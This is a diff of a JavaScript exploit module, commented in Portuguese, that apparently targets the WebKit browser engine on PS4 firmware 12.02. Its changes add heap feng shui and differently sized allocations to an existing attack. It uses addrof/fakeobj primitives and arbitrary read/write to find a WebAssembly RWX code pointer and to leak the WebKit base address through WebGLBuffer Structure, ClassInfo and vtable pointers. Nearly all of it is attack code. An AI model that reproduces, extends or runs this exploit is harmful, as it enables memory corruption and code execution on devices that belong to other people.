@@ -1,9 +1,12 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v115 - R75 - Foco na Depuração de Nível Baixo)
+// js/script3/testArrayBufferVictimCrash.mjs (v116 - R76 com Alocação Diferenciada e Restauração de Heap)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Confirmado o sucesso das primitivas de L/E e da instanciação WASM.
-// A falha no vazamento persiste devido à poluição de heap, sobrepondo ponteiros críticos.
-// O script reitera a necessidade CRÍTICA de depuração de baixo nível para avançar.
+// Implementa técnicas avançadas de Heap Feng Shui e Alocação Diferenciada
+// para tentar contornar a reutilização previsível de heap do PS4 12.02.
+// - WASM alocado com tamanho específico ANTES da poluição.
+// - Verificação L/E realizada em buffer de tamanho significativamente diferente.
+// - WebGL alocado com outro tamanho distinto.
+// - Tentativa de "restauração" de heap com padrões de limpeza.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -15,7 +18,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar WEBKIT_LIBRARY_INFO
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v115_R75_CriticalDebugReq";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v116_R76_DiffAllocRestore";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -35,7 +38,8 @@ function doubleToInt64(double) {
 }
 
 // --- Funções de Decodificação de Ponteiros (Ajustada para a Análise do PS4) ---
-const PS4_HEAP_BASE = AdvancedInt64.fromParts(0x20000000, 0); 
+// Constante NEW_POLLUTION_VALUE deve ser globalmente acessível para decodePS4Pointer.
+let NEW_POLLUTION_VALUE_GLOBAL = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF); // Definido aqui para escopo
 
 function decodePS4Pointer(encoded_adv_int64) {
     if (!isAdvancedInt64Object(encoded_adv_int64)) {
@@ -50,8 +54,8 @@ function decodePS4Pointer(encoded_adv_int64) {
 
     logS3(`    [decodePS4Pointer] Original: ${encoded_adv_int64.toString(true)}, Tag: ${toHex(typeTag)}, High_part: ${toHex(address_high_part)}`, "debug");
 
-    if (encoded_adv_int64.equals(NEW_POLLUTION_VALUE)) { // 'NEW_POLLUTION_VALUE' deve ser acessível aqui
-        logS3(`    [decodePS4Pointer] Valor de poluição detectado. Retornando como está (não é um ponteiro para decodificar).`, "warn");
+    if (encoded_adv_int64.equals(NEW_POLLUTION_VALUE_GLOBAL)) { // Usar a global
+        logS3(`    [decodePS4Pointer] Valor de poluição (${NEW_POLLUTION_VALUE_GLOBAL.toString(true)}) detectado. Retornando como está (não é um ponteiro para decodificar).`, "warn");
         return encoded_adv_int64; // Não é um ponteiro para decodificar, é o valor de poluição
     }
     
@@ -65,7 +69,7 @@ function decodePS4Pointer(encoded_adv_int64) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Diagnóstico de Vazamento (Alocação Pioneira, WebGL) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Diagnóstico de Vazamento (Alocação Pioneira, WebGL, Alocação Diferenciada) ---`, "test");
 
     let final_result = {
         success: false,
@@ -73,10 +77,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou falhou." }
     };
 
-    const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF); // Valor de poluição
+    // Atualiza a global para a instância atual da execução.
+    NEW_POLLUTION_VALUE_GLOBAL = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);
 
     // --- DEFINIÇÃO DE ADDROF/FAKEOBJ AQUI (Escopo Global da Função) ---
-    // Moved these definitions here to ensure they are available to all phases.
     const confused_array = [13.37];
     const victim_array = [{ a: 1 }];
     const addrof = (obj) => {
@@ -99,11 +103,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         let wasmInstance = null;
         let wasm_instance_addr = null;
 
+        const WASM_INSTANCE_SIZE_HINT = 0x120; // Tamanho típico de uma instância WASM (em bytes)
+
         try {
             // ** Heap Feng Shui Agressivo (antes do WASM) **
             logS3("  Executando Heap Feng Shui agressivo antes do WASM para tentar limpar o heap...", "info");
             let aggressive_feng_shui_objects = [];
-            for (let i = 0; i < 30000; i++) { // Aumentado para 30.000
+            for (let i = 0; i < 30000; i++) {
                 aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10));
                 aggressive_feng_shui_objects.push({});
                 aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50)));
@@ -114,6 +120,20 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             }
             aggressive_feng_shui_objects.length = 0;
             aggressive_feng_shui_objects = null;
+
+            // Técnica de Restauração de Heap para o tamanho WASM (antes de alocar WASM)
+            logS3(`  Tentando "limpar" a região de tamanho ${toHex(WASM_INSTANCE_SIZE_HINT)} para WASM...`, "debug");
+            let wasm_cleaner_pool = [];
+            for(let i = 0; i < 50; i++) { // Alocar alguns "limpadores"
+                const cleaner = new Uint8Array(WASM_INSTANCE_SIZE_HINT);
+                cleaner.fill(0xCC); // Padrão de limpeza
+                wasm_cleaner_pool.push(cleaner);
+            }
+            await PAUSE_S3(100); // Dar um tempo para o alocador processar
+            wasm_cleaner_pool.length = 0; // Liberar os limpadores
+            wasm_cleaner_pool = null;
+            logS3(`  Região de tamanho ${toHex(WASM_INSTANCE_SIZE_HINT)} supostamente limpa.`, "debug");
+
 
             await PAUSE_S3(5000); // Pausa ainda maior (5 segundos)
             logS3(`  Heap Feng Shui concluído. Pausa (5000ms) finalizada. Tentando compilar e instanciar WebAssembly (Pioneira)...`, "debug");
@@ -184,17 +204,19 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- FASE 4: Verificação Funcional de L/E e Poluição Intencional em Região Segura ---
         logS3("--- FASE 4: Verificação Funcional de L/E e Poluição Intencional em Região Segura ---", "subtest");
         
-        // Poluição de uma região de heap separada para o teste de L/E
-        const safe_test_region_array = new Array(100); // Cria um array em uma região separada
+        // Definir um tamanho para a região de teste L/E que seja DIFERENTE do tamanho WASM
+        const SAFE_TEST_REGION_SIZE = 0x10000; // 64KB, diferente de 0x120
+        const safe_test_region_array = new ArrayBuffer(SAFE_TEST_REGION_SIZE); // Cria um buffer de tamanho específico
         const safe_test_region_addr = addrof(safe_test_region_array);
-        logS3(`  Endereço da região segura para teste L/E: ${safe_test_region_addr.toString(true)}`, "info");
+        logS3(`  Endereço da região segura para teste L/E (Tamanho: ${toHex(SAFE_TEST_REGION_SIZE)}): ${safe_test_region_addr.toString(true)}`, "info");
         
         // Escreve o valor de poluição na região segura para teste L/E
-        const prop_spray_A_addr = safe_test_region_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET); // offset 0x10 para primeira prop
-        logS3(`  Escrevendo VALOR DE POLUIÇÃO: ${NEW_POLLUTION_VALUE.toString(true)} na região segura (${prop_spray_A_addr.toString(true)})...`, "info");
-        arb_write_final(prop_spray_A_addr, NEW_POLLUTION_VALUE);
+        // Para ArrayBuffer, o offset para o CONTENTS_IMPL_POINTER_OFFSET é 0x10
+        const write_target_addr_in_safe_region = safe_test_region_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET); 
+        logS3(`  Escrevendo VALOR DE POLUIÇÃO: ${NEW_POLLUTION_VALUE.toString(true)} na região segura (${write_target_addr_in_safe_region.toString(true)})...`, "info");
+        arb_write_final(write_target_addr_in_safe_region, NEW_POLLUTION_VALUE);
 
-        const value_read_for_verification = arb_read_final(prop_spray_A_addr);
+        const value_read_for_verification = arb_read_final(write_target_addr_in_safe_region);
         logS3(`>>>>> VERIFICAÇÃO L/E: VALOR LIDO DE VOLTA DA REGIÃO SEGURA: ${value_read_for_verification.toString(true)} <<<<<`, "leak");
 
         if (value_read_for_verification.equals(NEW_POLLUTION_VALUE)) {
@@ -229,9 +251,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 throw new Error("Ponteiro RWX decodificado é NaN.");
             }
             // A região RWX deve estar em um espaço de endereçamento alto, alinhado.
-            // A sua análise sugere que ponteiros WASM válidos podem ter tags 0x00-0x0F,
-            // e que 0x40 é para objetos JS comuns.
-            // O high-word de um endereço de código no PS4 geralmente é elevado.
             const is_sane_rwx_ptr = rwx_ptr_decoded.high() > 0x40000000 && (rwx_ptr_decoded.low() & 0xFFF) === 0;
             logS3(`  Verificação de Sanidade do Ponteiro RWX: Alto > 0x40000000 e alinhado a 0x1000? ${is_sane_rwx_ptr}`, is_sane_rwx_ptr ? "good" : "warn");
 
@@ -275,6 +294,21 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         // --- FASE 6: Tentativa de Vazamento via WebGL (Se WASM falhar) ---
         logS3("--- FASE 6: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT VIA WEBGL (Backup) ---", "subtest");
+
+        // Alocação e limpeza específica para WebGL (tamanho diferente de WASM e L/E)
+        const WEBGL_BUFFER_SIZE = 0x300; // Tamanho sugerido para WebGL
+        logS3(`  Tentando "limpar" a região de tamanho ${toHex(WEBGL_BUFFER_SIZE)} para WebGL...`, "debug");
+        let webgl_cleaner_pool = [];
+        for(let i = 0; i < 50; i++) {
+            const cleaner = new Uint8Array(WEBGL_BUFFER_SIZE);
+            cleaner.fill(0xCC);
+            webgl_cleaner_pool.push(cleaner);
+        }
+        await PAUSE_S3(100);
+        webgl_cleaner_pool.length = 0;
+        webgl_cleaner_pool = null;
+        logS3(`  Região de tamanho ${toHex(WEBGL_BUFFER_SIZE)} supostamente limpa.`, "debug");
+        
         try {
             const gl = document.createElement('canvas').getContext('webgl');
             if (!gl) {
@@ -285,8 +319,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             
             // Forçar exposição de metadados
             // A análise sugere gl.bufferData(gl.ARRAY_BUFFER, 1000, gl.STATIC_DRAW);
-            // Para maximizar a chance de vazamento de ponteiro, podemos tentar um tamanho maior ou variação.
-            gl.bufferData(gl.ARRAY_BUFFER, 0x10000, gl.STATIC_DRAW); // Alocar um buffer maior
+            gl.bufferData(gl.ARRAY_BUFFER, WEBGL_BUFFER_SIZE, gl.STATIC_DRAW); // Usar o tamanho diferenciado
             
             const gl_buffer_addr = addrof(buffer); // Obter o addrof do objeto JS do buffer WebGL
             logS3(`  Endereço do objeto WebGLBuffer (JS): ${gl_buffer_addr.toString(true)}`, "info");
@@ -298,7 +331,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 throw new Error("Addrof para WebGLBuffer é NaN.");
             }
             // Verificar poluição para o endereço do WebGLBuffer (antes de ler offsets)
-            if (gl_buffer_addr.equals(NEW_POLLUTION_VALUE)) {
+            if (gl_buffer_addr.equals(NEW_POLLUTION_VALUE_GLOBAL)) { // Usar a global
                 logS3(`    ALERTA DE POLUIÇÃO: Endereço do WebGLBuffer (${gl_buffer_addr.toString(true)}) está lendo o valor de poluição.`, "warn");
                 throw new Error("Endereço do WebGLBuffer poluído.");
             }
@@ -306,18 +339,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             // A instância WebGLBuffer (objeto JS) também deve ter uma Structure e pode ter ponteiros.
             // Para vazar a base do WebKit, precisamos de um ponteiro para código.
             // A análise sugere que a WebGL pode "forçar exposição de metadados".
-            // Isso significa que os metadados internos (ClassInfo, vtables) do objeto WebGLBuffer podem estar
-            // em uma partição acessível ou ter ponteiros para outras.
-
-            // Vamos tentar a mesma cadeia de vazamento (Structure -> ClassInfo -> put)
-            // se o objeto WebGLBuffer (JS) for um JSObject padrão.
-            // Esta é a mesma lógica de `performLeakAttemptFromObject`, mas adaptada para WebGL.
+            
             logS3(`  Tentando vazamento WebGL via cadeia Structure/vtable...`, "debug");
             const gl_structure_ptr_addr = gl_buffer_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
             const gl_structure_addr = arb_read_final(gl_structure_ptr_addr);
             logS3(`    Lido Structure* do WebGLBuffer: ${gl_structure_addr.toString(true)}`, "leak");
             
-            if (gl_structure_addr.equals(NEW_POLLUTION_VALUE)) {
+            if (gl_structure_addr.equals(NEW_POLLUTION_VALUE_GLOBAL)) { // Usar a global
                 logS3(`    ALERTA DE POLUIÇÃO: Structure* do WebGLBuffer está lendo o valor de poluição.`, "warn");
                 throw new Error("Structure* do WebGLBuffer poluído.");
             }
@@ -327,7 +355,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const gl_class_info_ptr_addr = gl_structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET);
             const gl_class_info_addr = arb_read_final(gl_class_info_ptr_addr);
             logS3(`    Lido ClassInfo* do WebGLBuffer: ${gl_class_info_addr.toString(true)}`, "leak");
-            if (gl_class_info_addr.equals(NEW_POLLUTION_VALUE)) {
+            if (gl_class_info_addr.equals(NEW_POLLUTION_VALUE_GLOBAL)) { // Usar a global
                 logS3(`    ALERTA DE POLUIÇÃO: ClassInfo* do WebGLBuffer está lendo o valor de poluição.`, "warn");
                 throw new Error("ClassInfo* do WebGLBuffer poluído.");
             }
@@ -337,7 +365,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const gl_put_func_ptr_addr = gl_structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
             const gl_put_func_addr = arb_read_final(gl_put_func_ptr_addr);
             logS3(`    Lido JSC::JSObject::put do WebGLBuffer: ${gl_put_func_addr.toString(true)}`, "leak");
-            if (gl_put_func_addr.equals(NEW_POLLUTION_VALUE)) {
+            if (gl_put_func_addr.equals(NEW_POLLUTION_VALUE_GLOBAL)) { // Usar a global
                 logS3(`    ALERTA DE POLUIÇÃO: JSC::JSObject::put do WebGLBuffer está lendo o valor de poluição.`, "warn");
                 throw new Error("JSC::JSObject::put do WebGLBuffer poluído.");
             }
